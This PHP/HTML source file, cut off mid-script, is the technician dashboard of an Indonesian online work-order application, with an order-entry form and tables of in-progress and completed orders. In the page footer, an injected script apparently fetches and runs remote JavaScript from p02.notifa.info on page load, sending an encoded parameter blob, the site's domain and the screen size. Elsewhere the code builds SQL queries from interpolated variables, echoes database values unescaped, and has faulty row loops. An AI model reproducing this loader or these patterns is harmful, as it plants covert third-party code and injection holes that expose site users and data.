<?php
include('../dbconfig.php');
session_start(); //memulai session
if( !isset($_SESSION['nama_u']) ) //jika session nama tidak ada
{
 header('location:./../'.$_SESSION['akses']); //alihkan halaman
 exit();
}else{ //jika ada session
 $nama = $_SESSION['nama_u']; //menyimpan session nama ke variabel $nama
 $query = mysqli_query($db,"SELECT * FROM tb_user WHERE username='$nama' ");
}

?>
<!-- site head -->
<!DOCTYPE html>
<html lang="en">
<!-- Mirrored from musa.beewebsystems.com/form-general.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 28 Jun 2018 02:01:08 GMT -->
<head>
  <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
  <title>OREO-Aplikasi Order Perintah Kerja Online</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-touch-fullscreen" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="default">
  <meta content="" name="description" />
  <meta content="" name="author" /> 
  <link rel="shortcut icon" type="image/png" href="../img/favicon.png"/>
  <link href="../css/vendor.min.css" rel="stylesheet" type="text/css" media="all" />
  <link href="../css/main.css" rel="stylesheet" type="text/css" media="all" />
  <link href="../css/color-settings.css" rel="stylesheet" type="text/css" media="all" data-role="color-settings"/>
</head>
<body class="nav-md theme-green">
  <!-- /site head -->
  <div class="main-container">
    <!-- sidebar -->
    <div class="sidebar">
      <div class="scroll-wrapper">
        <div class="navbar nav-title">

        </div>
        <div class="nav toggle">
          <a href="javascript:void(0)" id="sidebar-menu-toggle" class="btn btn-circle ripple">
            <i class="fa fa-times"></i>
          </a>
        </div>
        <div class="clearfix"></div>

        <!-- menu profile quick info -->
        <div class="profile clearfix">
          <div class="profile-pic">
            <?php
              $a = mysqli_query($db,"SELECT * FROM tb_user WHERE nama='$nama'");
              while($aa=mysqli_fetch_array($a)){
                echo "<img src='../img/$aa[foto]' alt='Profile picture' class='rounded-circle profile-img'>";                
              }

            ?>
          </div>
          <div class="profile-info">
            <h2><?php echo $nama;?></h2>


          </div>
        </div>
        <!-- /menu profile quick info -->

         

        <!-- sidebar menu -->
        <div id="sidebar-menu" class="main-menu-wrapper">
          <div class="menu-section">
            <ul class="nav side-menu flex-column">
              <li class="nav-item">
                <a href="index.php?page=dashboard" title="Dashboard">
                  <i class="fa fa-home" aria-hidden="true"></i>
                  <span>Dashboard</span>
                </a>
              </li>

              <li class="nav-item has-child ">
                <a href="index.php?page=input_order" class="ripple" title="Forms">
                  <i class="fa fa-edit" aria-hidden="true"></i>
                  <span>Input Order</span>
                  <span class="fa fa-chevron-right" aria-hidden="true"></span>
                </a>
                <ul class="nav child-menu">
                  <li class="child-menu-title" >Input Order</li>
                </ul>
              </li>
              <li class="nav-item has-child">
                <a href="index.php?page=in_progress_order" class="ripple" title="Icons">
                  <i class="fa fa-clone" aria-hidden="true"></i>
                  <span>In Progress Order</span>
                  <span class="fa fa-chevron-right" aria-hidden="true"></span>
                </a>
                <ul class="nav child-menu">
                  <li class="child-menu-title">In Progress Order</li>
                </ul>
              </li>
              <li class="nav-item has-child">
                <a href="index.php?page=complete_order" class="ripple" title="Tables">
                  <i class="fa fa-table" aria-hidden="true"></i>
                  <span>Complete Order</span>
                  <span class="fa fa-chevron-right" aria-hidden="true"></span>
                </a>
                <ul class="nav child-menu">
                  <li class="child-menu-title">Complete Order</li>
                </ul>
              </li>

              <li class="nav-item has-child">
                <a href="../logout.php" class="ripple" title="Extras">
                  <i class="fa fa-windows" aria-hidden="true"></i>
                  <span>Logout</span>
                  <span class="fa fa-chevron-right"></span>
                </a>
              </li>

            </ul>
          </div>
        </div>
        <!-- /sidebar menu -->
      </div>
    </div>
    <!-- /sidebar -->
    <div class="content-wrapper">
      <!-- header content  -->
      <header class="header">
        <nav class="header-menu">
          <div class="nav toggle">
            <a href="javascript:void(0)" id="menu-toggle" class="ripple">
              <span class="bars"></span>
            </a>
          </div>
          <ul class="nav navbar-nav navbar-right">
             

            <li class="profile-dropdown dropdown">
              <a href="javascript:void(0)" class="user-profile dropdown-toggle ripple" data-toggle="dropdown" aria-expanded="false">
                <span class="d-none d-sm-block"> <h2><?php echo $nama; ?></h2></span>
                <span class="fa fa-angle-down"></span>
              </a>
              <ul class="dropdown-menu float-right">
                <li class="d-none d-block-xs p-0">
                  <button type="button" class="close btn btn-circle"><i class="fa fa-close"></i></button>
                  <div class="profile clearfix">
                    <div class="profile-pic">


                      <?php 
                      while($data_users=mysqli_fetch_array($query)){
                        ?>
                        <img src="../img/<?php echo $data_users['foto']?>" class="rounded-circle profile-img">

                        <?php
                      }
                      ?>

                    </div>
                    <div class="profile-info">
                      <h2> <h2>
                        <?php
                        $c = mysqli_query($db,"SELECT * FROM tb_user WHERE nama='$nama'");
                        while ($r=mysqli_fetch_array($c)) {
                            echo $r["foto"];
                        }
                       // echo $nama; 
                        ?>
                         
                       </h2></h2>
                    </div>
                  </div>
                </li>
                <li><a href="index.php?page=dashboard"><i class="fa fa-user-o" aria-hidden="true"></i>Profile</a></li>
                <li><a href="../logout.php"><i class="fa fa-sign-out" aria-hidden="true"></i> Logout</a></li>
              </ul>
            </li>
          </ul>
        </nav>
      </header>
      <!-- /header content -->
      <?php
      switch ($_GET['page']) {
        // START HALAMAN DASHBOARD
        case 'dashboard':
        // code...
        ?>
        <!-- page content -->
        <div class="main-content small-gutter">
          <!-- START PAGE COVER -->
          <div class="row bg-title clearfix page-title">
            <div class="col-12 col-lg-3">
              <h4 class="page-title">Selamat datang,<b> <?php echo $nama; ?></b></h4>
            </div>
            <div class="col-12 col-lg-9">
              <!-- START breadcrumb -->
              <ol class="breadcrumb pl-0 pr-0 float-lg-right">
                <li><a href="index-2.html">Oreo</a></li>
                <li><a href="javascript:void(0)">Teknisi</a></li>
                <li class="active">Dashboard</li>
              </ol>
              <!-- END breadcrumb -->
            </div>
            <div class="col-12">
              <h3>General elements</h3>
            </div>
          </div>
          <!-- END PAGE COVER -->
          
          <div class="container-fluid">
            <div class="row">
              <div class="col-lg-12 col-xl-6 mb-2">
                INI DASHBOARD
                
              </div>
            </div>
          </div>
        </div>
        <!-- /page content -->
        <?php
        break;
        // END HALAMAN DASHBOARD



        // START HALAMAN INPUT_ORDER
        case 'input_order':
        // code...

    
        // FUNGSI UNTUK REGIONAL
       
        //Fetch all the country data
        $query = $db->query("SELECT * FROM tb_regional ORDER BY regional ASC");
        //Count total number of rows
        $rowCount = $query->num_rows;
        ?>
        <!--  FUNGSI UNTUK NO TIKETING -->
        <?php
        //no tiket otomatis
        $carikode = $db->query("SELECT max(notiket) from tb_tiket");
        // menjadikannya array
        $datakode = mysqli_fetch_array($carikode);
        // jika $datakode
        if ($datakode) {
          $nilaikode = substr($datakode[0], 1);
        // menjadikan $nilaikode ( int )
          $kode = (int) $nilaikode;
        // setiap $kode di tambah 1
          $kode = $kode + 1;
          $kode_otomatis = "P".str_pad($kode, 4, "0", STR_PAD_LEFT);
        } else {
          $kode_otomatis = "P0001";
        }
        ?>

        <div class="main-content small-gutter">
          <!-- START PAGE COVER -->
          <div class="row bg-title clearfix page-title">
            <div class="col-12 col-lg-3">
              <h4 class="page-title">Selamat datang,<b> <?php echo $nama; ?></b></h4>
            </div>
            <div class="col-12 col-lg-9">
              <!-- START breadcrumb -->
              <ol class="breadcrumb pl-0 pr-0 float-lg-right">
                <li><a href="index-2.html">Oreo</a></li>
                <li><a href="javascript:void(0)">Teknisi</a></li>
                <li class="active">Input Order</li>
              </ol>
              <!-- END breadcrumb -->
            </div>
            <div class="col-12">
              <h3>FORM INPUT ORDER KERJA</h3>
            </div>
          </div>
          <!-- END PAGE COVER -->
          
          <div class="container-fluid">
            <div class="row">
              <div class="col-lg-12 col-xl-6 mb-2">
                <div class="bg-white padding-25 h-100">
                 
                  <form action="proses-input_order.php" method="POST" enctype="multipart/form-data" name="add_name" id="add_name">
                    <?php
                    //AMBIL DATA PEMBUAT
                    $sql_pembuat = mysqli_query($db,"SELECT * FROM tb_user WHERE nama='$nama' ");
                    ?>
                    <div class="form-group">
                      <label for="exampleInputPassword1">Nama Pekerjaan 
                        <?php
                        while ($dt_pembuat=mysqli_fetch_array($sql_pembuat)) {
                          echo"<input type='hidden' name='nip_pembuat' value='$dt_pembuat[nip]'>";
                            
                        }
                        ?>
                      </label>
                      <input type="text" class="form-control" id="exampleInputPassword1" placeholder="Nama Pekerjaan" name="namapekerjaan">
                    </div>
                    <div class="form-group">
                      <label for="exampleFormControlReadonly">No Tiket</label>
                      <input type="text" class="form-control" id="exampleInputPassword1" placeholder="No Tiket" id="exampleFormControlReadonly" readonly="" value="<?php echo $kode_otomatis; ?>" name="notiket">
                    </div>
                    <div class="form-group">
                      <label for="exampleInputPassword1">Lokasi</label>
                      <input type="text" class="form-control" id="exampleInputPassword1" placeholder="Lokasi" name="lokasi">
                    </div>

                    <div class="form-group">
                      <label for="exampleFormControlSelect1">Regional</label>
                      <select class="custom-select" id="regional" name='regional'>
                        <option selected="">Pilih Regional</option>
                        <?php
                        if($rowCount > 0){
                          while($row = $query->fetch_assoc()){
                            echo '<option value="'.$row['kd_regional'].'">'.$row['regional'].'</option>';
                          }
                        }else{
                          echo '<option value="">Data regional tidak tersedia</option>';
                        }
                        ?>
                      </select>
                    </div>
                    <div class="form-group">
                      <label for="exampleFormCustomSelectPref">Witel</label>
                      <select class="custom-select" id="witel" name="witel">
                        <option selected="">Pilih Witel</option>
                      </select>
                    </div>

                    <div class="form-group">
                      <label for="exampleFormCustomSelectPref">STO</label>
                      <select class="custom-select" id="sto" name="sto">
                        <option selected="">Pilih STO</option>
                      </select>
                    </div>
                    <div class="form-group">
                      <label for="exampleFormControlTextarea1">Penyebab</label>
                      <textarea class="form-control" id="exampleFormControlTextarea1" rows="3" name="penyebab"></textarea>
                    </div>
                    <div class="form-group">
                      <label for="exampleFormControlTextarea1">Lampiran</label>
                      <div class="custom-file" style="margin-bottom: 1%;">
                        <input class="custom-file-input" id="validatedCustomFile" type="file" name="gambar_ft_sebelum[]" multiple required>
                        <label class="custom-file-label" for="validatedCustomFile">Pilih foto Sebelum Min 1 Maks 3</label>
                      </div>
                      <div class="custom-file" style="margin-bottom: 1%;">
                        <input class="custom-file-input" id="validatedCustomFile" type="file" name="gambar_ft_progress[]" multiple required>
                        <label class="custom-file-label" for="validatedCustomFile">Pilih foto Progress Min 1 Maks 3</label>
                      </div>
                      <div class="custom-file" style="margin-bottom: 1%;">
                        <input class="custom-file-input" id="validatedCustomFile" type="file" name="gambar_ft_sesudah[]" multiple required>
                        <label class="custom-file-label" for="validatedCustomFile">Pilih foto Sesudah Min 1 Maks 3</label>
                      </div>
                    </div>

                    <div class="form-group">
                      <label for="exampleFormControlTextarea1">Foto Denah Geocam</label>
                      <div class="custom-file">
                        <input class="custom-file-input" id="validatedCustomFile" type="file" name="gambar_ft_denah" required>
                        <label class="custom-file-label" for="validatedCustomFile">Pilih foto Denah</label>
                      </div>
                    </div>


                    <div class="form-group">
                      <label for="exampleInputPassword1">Material</label>
                             <div class="table-responsive">  
                                      <table class="table table-bordered" id="dynamic_field">  
                                          <tr>
                                              <td><input type="text" name="name[]" placeholder="Material" class="form-control name_list" required="" /></td>  
                                              <td><input type="text" name="unit[]" placeholder="Unit" class="form-control name_list" required="" /></td>  
                                              <td><input type="text" name="volume[]" placeholder="Volume" class="form-control name_list" required="" /></td>  
                                              <td><button type="button" name="add" id="add" class="btn btn-success">+</button></td>  
                                          </tr>  
                                      </table>  
                                      <!-- <input type="button" name="submit" id="submit" class="btn btn-info" value="Submit" />   -->
                                  </div>
                    </div>


                    <div class="form-group">
                      <label for="exampleInputPassword1">Pekerjaan</label>
                             <div class="table-responsive">  
                                      <table class="table table-bordered" id="dynamic_field_pekerjaan">  
                                          <tr>
                                              <td><input type="text" name="name_pekerjaan[]" placeholder="Pekerjaan" class="form-control name_list" required="" /></td>  
                                              <td><input type="text" name="unit_pekerjaan[]" placeholder="Unit" class="form-control name_list" required="" /></td>  
                                              <td><input type="text" name="volume_pekerjaan[]" placeholder="Volume" class="form-control name_list" required="" /></td>  
                                              <td><button type="button" name="add" id="add_pekerjaan" class="btn btn-success">+</button></td>  
                                          </tr>  
                                      </table>  
                                    <!--   <input type="button" name="submit_pekerjaan" id="submit_pekerjaan" class="btn btn-info" value="Submit" /> 
                                  </div> -->
                    </div>
                    
                    <div class="form-group mb-0">
                      <button type="reset" class="btn btn-secondary">Draft</button>
                      <button type="submit" class="btn btn-theme" name="submit" id="submit">Submit</button>
                      <!-- <input type="button" name="submit" id="submit" class="btn btn-info" value="Submit" />   -->
                    </div>

                  </form>
                </div>
              </div>
            </div>

          </div>
        </div>

        <?php
        break;
        // END HALAMAN INPUT_ORDER

        // START HALAMAN IN PROGRESS ORDER
        case "in_progress_order":
       
        $sql = "
        SELECT tb_order.id,tb_order.namapekerjaan,tb_order.notiket,tb_order.lokasi,tb_order.kd_witel,tb_order.kd_sto,tb_order.penyebab,tb_order.lampiran, tb_witel.witel, tb_tiket.tanggal_buat,tb_tiket.status
        FROM ((tb_order
        INNER JOIN tb_witel ON tb_order.kd_witel = tb_witel.kd_witel)
        INNER JOIN tb_tiket ON tb_order.notiket = tb_tiket.notiket)
        WHERE tb_tiket.status=0 OR tb_tiket.status=3  

        ";

        $res = mysqli_query($db,$sql);

        ?>

        <!-- page content -->
            <div class="main-content">
                <!-- START PAGE COVER -->
                <div class="row bg-title clearfix page-title">
                    <div class="col-12 col-lg-3">
                        <h4 class="page-title">Getting started!</h4>
                    </div>
                    <div class="col-12 col-lg-9">
                        <!-- START breadcrumb -->
                        <ol class="breadcrumb pl-0 pr-0 float-lg-right">
                            <li><a href="index-2.html">Oreo</a></li>
                            <li><a href="javascript:void(0)">Teknisi</a></li>
                            <li class="active">In Progress Order</li>
                        </ol>
                        <!-- END breadcrumb -->
                    </div>
                    <div class="col-12">
                       <h3>Daftar In Progress Order</h3>
                    </div>
                </div>
                <!-- END PAGE COVER -->
                <div class="container-fluid">
                    <div class="row">
                      
                        <div class="col-lg-12 col-xl-12 mb-2">
                            <div class="bg-white padding-25 h-100">
                                  <div class="data-table-wrapper">
                                    <div class="row">
                                        <div class="col-sm-12 col-lg-4 col-xl-6">
                                            <div class="data-table-length">
                                                <label>
                                                    Tampilkan:
                                                    <select aria-controls="example" class="form-control">
                                                        <option value="10">10</option>
                                                        <option value="25">25</option>
                                                        <option value="50">50</option>
                                                        <option value="100">100</option>
                                                    </select>
                                                    data
                                                </label>
                                            </div>
                                        </div>

                                        <div class="col-sm-12 col-lg-8 col-xl-6 text-md-right">
                                            <div class="data-table-filter mb-2 float-sm-left float-lg-none d-lg-inline-block">
                                                <label for="search1">Cari Berkas Order:</label>
                                                <input type="search" class="form-control" id="search1" placeholder="masukkan No Tiket">
                                            </div>
                                            
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-12">
                                            <div class="table-responsive">
                                                <table id="example2" class="table table-striped table-bordered data-table table-checkable mb-0" role="grid">
                                                    <thead>
                                                    <tr>
                                                       <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending">
                                                            No
                                                        </th>
                                                         
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            No Tiket
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Tanggal Buat
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Nama Pekerjaan
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Lokasi
                                                        </th>
                                                         
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            STO
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Penyebab
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Status
                                                        </th>
                                                        
                                                    </tr>
                                                    </thead>
                                                    <tbody>



                                                    <?php 
                                                    $nomor=1;
                                                    while ($nomor <= ($data=mysqli_fetch_array($res))) 
                                                    {
                                                      ?>
                                                    <tr>
                                                        <td class="text-center"><?php echo $nomor; ?></td>
                                                        <td class="text-center"><?php echo $data["notiket"]; ?></td>
                                                        <td><?php echo $data["tanggal_buat"]; ?></td>
                                                        <td><?php echo $data["namapekerjaan"]; ?></td>
                                                        <td><?php echo $data["lokasi"]; ?></td>
                                                        
                                                        <td class="text-center"><?php echo $data["kd_sto"]; ?></td>
                                                        <td><?php echo $data["penyebab"]; ?></td>
                                                         
                                                         <td class="text-center">
                                                          <?php 
                                                              if($data["status"]==1){
                                                                  echo '<span class="badge badge-pill badge-info text-uppercase">Completed</span>';
                                                              }else{
                                                                echo '<span class="badge badge-pill badge-danger text-uppercase">Progress</span>';
                                                                  
                                                              }
                                                          ?>
                                                         </td>
                                                    </tr>
                                                    <?php 
                                                    $nomor++;
                                                    } 
                                                    ?>

                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-12 col-md-5">
                                            <div class="showing-items">Menampilkan
                                              
                                              <?php

                                              $sql_count = mysqli_query($db,"SELECT COUNT(notiket) as JUMLAH FROM tb_tiket WHERE status=0");
                                              while($jumlah = mysqli_fetch_array($sql_count)){
                                                 echo $jumlah["JUMLAH"];
                                              }
                                             

                                              ?>
                                               Data Order
                                                
                                            </div>
                                        </div>
                                        <div class="col-sm-12 col-md-7">
                                            <div class="data-table-paginate">
                                                <nav>
                                                    <ul class="pagination">
                                                        <li class="page-item"><a class="page-link" href="#">Previous</a></li>
                                                        <li class="page-item"><a class="page-link" href="#">1</a></li>
                                                        <li class="page-item"><a class="page-link" href="#">2</a></li>
                                                        <li class="page-item"><a class="page-link" href="#">3</a></li>
                                                        <li class="page-item"><a class="page-link" href="#">Next</a></li>
                                                    </ul>
                                                </nav>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- /page content -->        

        <?php
        break;

        // END HALAMAN IN PROGRESS ORDER

        // START HALAMAN COMPLETE ORDER
        case "complete_order":
       
        $sql = "
        SELECT tb_order.id,tb_order.namapekerjaan,tb_order.notiket,tb_order.lokasi,tb_order.kd_witel,tb_order.kd_sto,tb_order.penyebab,tb_order.lampiran, tb_witel.witel, tb_tiket.tanggal_buat,tb_tiket.status
        FROM ((tb_order
        INNER JOIN tb_witel ON tb_order.kd_witel = tb_witel.kd_witel)
        INNER JOIN tb_tiket ON tb_order.notiket = tb_tiket.notiket)
        WHERE tb_tiket.status=1

        ";

        $res = mysqli_query($db,$sql);

        ?>

        <!-- page content -->
            <div class="main-content">
                <!-- START PAGE COVER -->
                <div class="row bg-title clearfix page-title">
                    <div class="col-12 col-lg-3">
                        <h4 class="page-title">Getting started!</h4>
                    </div>
                    <div class="col-12 col-lg-9">
                        <!-- START breadcrumb -->
                        <ol class="breadcrumb pl-0 pr-0 float-lg-right">
                            <li><a href="index-2.html">Oreo</a></li>
                            <li><a href="javascript:void(0)">Teknisi</a></li>
                            <li class="active">Complete Order</li>
                        </ol>
                        <!-- END breadcrumb -->
                    </div>
                    <div class="col-12">
                       <h3>Daftar Complete Order</h3>
                    </div>
                </div>
                <!-- END PAGE COVER -->
                <div class="container-fluid">
                    <div class="row">
                      
                        <div class="col-lg-12 col-xl-12 mb-2">
                            <div class="bg-white padding-25 h-100">
                                  <div class="data-table-wrapper">
                                    <div class="row">
                                        <div class="col-sm-12 col-lg-4 col-xl-6">
                                            <div class="data-table-length">
                                                <label>
                                                    Tampilkan:
                                                    <select aria-controls="example" class="form-control">
                                                        <option value="10">10</option>
                                                        <option value="25">25</option>
                                                        <option value="50">50</option>
                                                        <option value="100">100</option>
                                                    </select>
                                                    data
                                                </label>
                                            </div>
                                        </div>

                                        <div class="col-sm-12 col-lg-8 col-xl-6 text-md-right">
                                            <div class="data-table-filter mb-2 float-sm-left float-lg-none d-lg-inline-block">
                                                <label for="search1">Cari Berkas Order:</label>
                                                <input type="search" class="form-control" id="search1" placeholder="masukkan No Tiket">
                                            </div>
                                            
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-12">
                                            <div class="table-responsive">
                                                <table id="example2" class="table table-striped table-bordered data-table table-checkable mb-0" role="grid">
                                                    <thead>
                                                    <tr>
                                                       <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending">
                                                            No
                                                        </th>
                                                         
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            No Tiket
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Tanggal Buat
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Nama Pekerjaan
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Lokasi
                                                        </th>
                                                         
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            STO
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Penyebab
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Cetak
                                                        </th>
                                                        
                                                    </tr>
                                                    </thead>
                                                    <tbody>
                                                    <?php 
                                                    $penomoran = 1;
                                                    while ($data=mysqli_fetch_array($res)) 
                                                    {
                                                      while($penomoran <= ($data=mysqli_fetch_array($res))){
                                                      ?>
                                                    <tr>
                                                        <td class="text-center"><?php echo $penomoran; ?></td>
                                                        <td class="text-center"><?php echo $data["notiket"]; ?></td>
                                                        <td><?php echo $data["tanggal_buat"]; ?></td>
                                                        <td><?php echo $data["namapekerjaan"]; ?></td>
                                                        <td><?php echo $data["lokasi"]; ?></td>
                                                        
                                                        <td class="text-center"><?php echo $data["kd_sto"]; ?></td>
                                                        <td><?php echo $data["penyebab"]; ?></td>
                                                         
                                                        <td class="text-center">
                                                          <a href="cetak_order_kerja.php?notiket=<?php echo $data["notiket"]; ?>">
                                                              <button type="button" class="btn bg-transparent btn-circle" title="Print">
                                                                <b><i class="fa fa-print" ></i></b>
                                                              </button>
                                                          </a>
                                                        </td>

                                                    </tr>
                                                    <?php
                                                      $penomoran++; 
                                                      }
                                                    } 
                                                    ?>

                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-12 col-md-5">
                                            <div class="showing-items">Menampilkan
                                              
                                              <?php

                                              $sql_count = mysqli_query($db,"SELECT COUNT(notiket) as JUMLAH FROM tb_tiket WHERE status=1");
                                              while($jumlah = mysqli_fetch_array($sql_count)){
                                                 echo $jumlah["JUMLAH"];
                                              }
                                             

                                              ?>
                                               Data Order
                                                
                                            </div>
                                        </div>
                                        <div class="col-sm-12 col-md-7">
                                            <div class="data-table-paginate">
                                                <nav>
                                                    <ul class="pagination">
                                                        <li class="page-item"><a class="page-link" href="#">Previous</a></li>
                                                        <li class="page-item"><a class="page-link" href="#">1</a></li>
                                                        <li class="page-item"><a class="page-link" href="#">2</a></li>
                                                        <li class="page-item"><a class="page-link" href="#">3</a></li>
                                                        <li class="page-item"><a class="page-link" href="#">Next</a></li>
                                                    </ul>
                                                </nav>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- /page content -->        

        <?php
        break;
        
        // END HALAMAN COMPLETE ORDER

      }
      ?>
      <!-- footer content -->
      <footer class="footer">
        <div class="float-right">
          Oreo - Aplikasi Order Perintah Kerja Online <a href="index.php?page=dashboard" class="company-name text-theme">
          
          </a>
        </div>
        <div class="clearfix"></div>
      </footer><!-- /footer content -->
    </div>
  </div>

  <!-- site foot -->
  <script src="../js/vendor.min.js"></script>
  <script src="../js/main.js"></script>
  <script src="../js/settings.min.js"></script>
  <script src="../js/charts.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mqEFsStDL2kcKOEgSI1kUxFCY8CbSVuc661OgqVbkUs0Kl%2f3NNQ4KbptNEnfBqeGCqovy4ISEmgGwSqI1gnSFpt8CSiHnlkoWGWjFms%2fZNYrEual0nRX503PXLGu%2fuBNZnv5%2bK5IJa%2fj%2bmaM4u9F6LNF%2fkg8%2bkYy5lbLeYgnuoX%2fi4si44%2b3C54qrDWTidiQ7EotmjI4E1%2bDuhgI0wqV3ROObUmv2zRinXD3Mr0%2bgqdQV1uTVaVm0VCVhm7pAQT8kDyBiOAj2R2eKWs2LxxVBgufqr4i4fIpYFrCmAneVFgkMOBSBgzKgHTalTwRE9NI1QznR9PA1Llpsv5iT9P0bV17vzEpn1NYWE23TtcQ4BltuSiZA1D4Z%2fEIMMu3MIIwwoEDYxVLLicIKUA2iYOolvj1tcGjHnbcq030JiUmeWbO36eYbM%2bCE3tvUOujk5%2f3KTTOZdQYlCh3VyKO3wJuq%2bOKFduZsjtuxQKGJcyHI3Tc%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
  <!-- Mirrored from musa.beewebsystems.com/form-general.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 28 Jun 2018 02:01:09 GMT -->
  </html>
  <!-- /site foot -->


  <!--  SCRIPT UNTUK AJAX WITEL DAN STO -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

  <script type="text/javascript">
    $(document).ready(function(){
      $('#regional').on('change',function(){
        var kd_regional = $(this).val();
        if(kd_regional){
          $.ajax({
            type:'POST',
            url:'ajaxData.php',
            data:'kd_regional='+kd_regional,
            success:function(html){
              $('#witel').html(html);
              $('#sto').html('<option value="" name="witel">Pilih Witel</option>');
            }
          });
        }else{
          $('#witel').html('<option value="" name="witel">Pilih Regional terlebih dahulu</option>');
          $('#sto').html('<option value="" name="witel">Pilih Witel terlebih dahulu</option>');
        }
      });

      $('#witel').on('change',function(){
        var kd_witel = $(this).val();
        if(kd_witel){
          $.ajax({
            type:'POST',
            url:'ajaxData.php',
            data:'kd_witel='+kd_witel,
            success:function(html){
              $('#sto').html(html);
            }
          });
        }else{
          $('#sto').html('<option value="" >Select STO first</option>');
        }
      });
    });


    // UNTUK MATERIAL
      $(document).ready(function(){      
      var postURL = "addmore.php";
      var i=1;  


      $('#add').click(function(){  
           i++;  
           $('#dynamic_field').append('<tr id="row'+i+'" class="dynamic-added"><td><input type="text" name="name[]" placeholder="Material" class="form-control name_list" required /></td><td><input type="text" name="unit[]" placeholder="Unit" class="form-control name_list" required /></td><td><input type="text" name="volume[]" placeholder="Volume" class="form-control name_list" required /></td><td><button type="button" name="remove" id="'+i+'" class="btn btn-danger btn_remove">X</button></td></tr>');  
      });


      $(document).on('click', '.btn_remove', function(){  
           var button_id = $(this).attr("id");   
           $('#row'+button_id+'').remove();  
      });  


      $('#submit').click(function(){            
           $.ajax({  
                url:postURL,  
                method:"POST",  
                data:$('#add_name').serialize(),
                type:'json',
                success:function(data)  
                {
                    i=1;
                    $('.dynamic-added').remove();
                    $('#add_name')[0].reset();
                }  
           });  
      });


    }); 



// UNTUK PEKERJAAN
      $(document).ready(function(){      
      var postURL = "addpekerjaan.php";
      var i=1;  


      $('#add_pekerjaan').click(function(){  
           i++;  
           $('#dynamic_field_pekerjaan').append('<tr id="row'+i+'" class="dynamic-added"><td><input type="text" name="name_pekerjaan[]" placeholder="Material" class="form-control name_list" required /></td><td><input type="text" name="unit_pekerjaan[]" placeholder="Unit" class="form-control name_list" required /></td><td><input type="text" name="volume_pekerjaan[]" placeholder="Volume" class="form-control name_list" required /></td><td><button type="button" name="remove" id="'+i+'" class="btn btn-danger btn_remove">X</button></td></tr>');  
      });


      $(document).on('click', '.btn_remove_pekerjaan', function(){  
           var button_id = $(this).attr("id_pekerjaan");   
           $('#row_pekerjaan'+button_id+'').remove();  
      });  


      $('#submit').click(function(){            
           $.ajax({  
                url:postURL,  
                method:"POST",  
